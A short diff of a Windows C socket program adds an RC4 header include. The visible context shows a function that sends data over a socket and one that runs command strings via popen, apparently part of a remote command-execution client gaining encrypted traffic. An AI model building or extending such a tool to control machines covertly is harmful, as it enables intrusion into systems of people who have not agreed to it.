@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <winsock2.h>
 #include <windows.h>
+#include "./rc4.h"
 
 
 #define LEN_MSG 256
@@ -79,6 +80,7 @@ int sendData(char* message) {
     closesocket(serverFd);
     return 0;
 }
+
 
 char* execute(char* command) {
     FILE* exec = popen(command, "r");
